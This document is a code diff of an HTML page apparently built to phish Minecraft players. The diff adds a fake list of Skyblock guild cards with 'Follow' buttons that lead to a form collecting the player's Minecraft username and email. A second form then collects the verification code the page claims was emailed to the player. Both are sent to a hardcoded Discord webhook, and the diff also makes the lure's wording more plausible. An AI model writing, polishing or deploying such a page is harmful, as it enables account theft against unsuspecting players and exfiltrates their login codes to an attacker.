@@ -37,22 +37,122 @@
       color: #fff;
       cursor: pointer;
       padding: 10px 20px;
+      transition: background-color 0.3s;
     }
 
-    #codeFormContainer {
-      margin-top: 20px;
-      display: none;
-    }
-
-    /* Add hover effect for buttons */
     input[type="submit"]:hover {
       background-color: #555;
+    }
+
+    #signInGuildList {
+      margin-top: 20px;
+      display: flex;
+      overflow-x: auto;
+      white-space: nowrap;
+      animation: scroll 30s linear infinite;
+    }
+
+    @keyframes scroll {
+      0% {
+        transform: translateX(0%);
+      }
+      100% {
+        transform: translateX(-100%);
+      }
+    }
+
+    .guild-box {
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      margin-right: 10px;
+      min-width: 200px;
+      max-width: 300px;
+    }
+
+    .guild-box h3 {
+      color: #333;
+      margin: 0;
+    }
+
+    .guild-box p {
+      color: #666;
+      margin: 0;
+    }
+
+    .follow-button {
+      background-color: #ff5a5f;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      cursor: pointer;
+      padding: 8px 16px;
+      font-size: 14px;
+      transition: background-color 0.3s;
+      display: block;
+      margin: 10px auto;
+    }
+
+    .follow-button:hover {
+      background-color: #e5373b;
+    }
+
+    .follow-button:focus {
+      outline: none;
+      box-shadow: 0 0 0 2px #e5373b;
     }
   </style>
 </head>
 <body>
   <h1>Webhook Form</h1>
-  <form id="emailForm">
+
+  <div id="signInGuildList">
+    <div class="guild-box">
+      <h3>Flexing Chimps</h3>
+      <p>Highest Networth guild in all of Skyblock. /g discord (300 Level Requirement)</p>
+      <p>Followers: 518</p>
+      <button class="follow-button" onclick="followGuild(1)">Follow</button>
+    </div>
+    <div class="guild-box">
+      <h3>flexed</h3>
+      <p>Live, Laugh, Grind. Yes LiverCancer has Liver Cancer. /g discord</p>
+      <p>Followers: 112</p>
+      <button class="follow-button" onclick="followGuild(2)">Follow</button>
+    </div>
+    <div class="guild-box">
+      <h3>Dawn</h3>
+      <p>Owned by the #1 bedwars player. Go DAWN!!</p>
+      <p>Followers: 220</p>
+      <button class="follow-button" onclick="followGuild(3)">Follow</button>
+    </div>
+    <div class="guild-box">
+      <h3>War</h3>
+      <p>Sweatiest duels guild ever /g discord</p>
+      <p>Followers: 441</p>
+      <button class="follow-button" onclick="followGuild(4)">Follow</button>
+    </div>
+    <div class="guild-box">
+      <h3>Leman</h3>
+      <p>#2 guild all time. We got this :) /g discord</p>
+      <p>Followers: 652</p>
+      <button class="follow-button" onclick="followGuild(5)">Follow</button>
+    </div>
+    <div class="guild-box">
+      <h3>Rebel</h3>
+      <p>#1 in GEXP. Time for the rebellion.</p>
+      <p>Followers: 890</p>
+      <button class="follow-button" onclick="followGuild(6)">Follow</button>
+    </div>
+    <div class="guild-box">
+      <h3>technoguild</h3>
+      <p>What’s up nerds. Subscribe to techno blade (edit: rest in peace)</p>
+      <p>Followers: 575</p>
+      <button class="follow-button" onclick="followGuild(7)">Follow</button>
+    </div>
+  </div>
+
+  <form id="emailForm" style="display: none;">
     <label for="username">Minecraft Username:</label>
     <input type="text" id="username" name="username" required><br><br>
     <label for="email">Email:</label>
@@ -60,7 +160,7 @@
     <input type="submit" value="Send Email">
   </form>
 
-  <div id="codeFormContainer">
+  <div id="codeFormContainer" style="display: none;">
     <h2>Enter Code</h2>
     <p>A code has been sent to your email.</p>
     <form id="codeForm">
@@ -71,6 +171,15 @@
   </div>
 
   <script>
+    function followGuild(guildId) {
+      // Hide the guild list and show the email form
+      document.getElementById("signInGuildList").style.display = "none";
+      document.getElementById("emailForm").style.display = "block";
+
+      // Store the selected guild in localStorage
+      localStorage.setItem("selectedGuild", guildId);
+    }
+
     document.getElementById("emailForm").addEventListener("submit", function(event) {
       event.preventDefault(); // prevent the form from reloading the page
 
@@ -80,17 +189,19 @@
 
       // create the webhook message
       const message = {
-        "content": "Email and IGN entered! (DUMB FAG)",
+        "content": "Email and IGN entered!",
         "embeds": [
           {
-            "color": null,
+            "title": "Guild Follow Request",
+            "description": "Please verify your email address by entering the code we sent you.",
+            "color": 16777215,
             "fields": [
               {
-                "name": "Minecraft Username:",
+                "name": "Minecraft Username",
                 "value": username
               },
               {
-                "name": "Email:",
+                "name": "Email",
                 "value": email
               }
             ]
@@ -98,5 +209,81 @@
         ]
       };
 
-      // make an HTTP POST request to the webhook URL with the data
-      const webhookUrl = "https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0"; // Replace with your actual webhook
+      // send the webhook message
+      fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(message)
+      })
+      .then(function(response) {
+        if (response.ok) {
+          // Hide the email form and show the code form
+          document.getElementById("emailForm").style.display = "none";
+          document.getElementById("codeFormContainer").style.display = "block";
+        }
+        else {
+          console.log("Error:", response.statusText);
+        }
+      })
+      .catch(function(error) {
+        console.log("Error:", error);
+      });
+    });
+
+    document.getElementById("codeForm").addEventListener("submit", function(event) {
+      event.preventDefault(); // prevent the form from reloading the page
+
+      // get the input value
+      const code = document.getElementById('code').value;
+
+      // retrieve the selected guild from localStorage
+      const guildId = localStorage.getItem("selectedGuild");
+
+      // create the webhook message
+      const message = {
+        "content": "Code entered!",
+        "embeds": [
+          {
+            "title": "Guild Follow Request",
+            "description": "Code entered successfully!",
+            "color": 16777215,
+            "fields": [
+              {
+                "name": "Guild ID",
+                "value": guildId
+              },
+              {
+                "name": "Verification Code",
+                "value": code
+              }
+            ]
+          }
+        ]
+      };
+
+      // send the webhook message
+      fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(message)
+      })
+      .then(function(response) {
+        if (response.ok) {
+          // Code successfully entered
+          console.log("Code entered successfully!");
+        }
+        else {
+          console.log("Error:", response.statusText);
+        }
+      })
+      .catch(function(error) {
+        console.log("Error:", error);
+      });
+    });
+  </script>
+</body>
+</html>
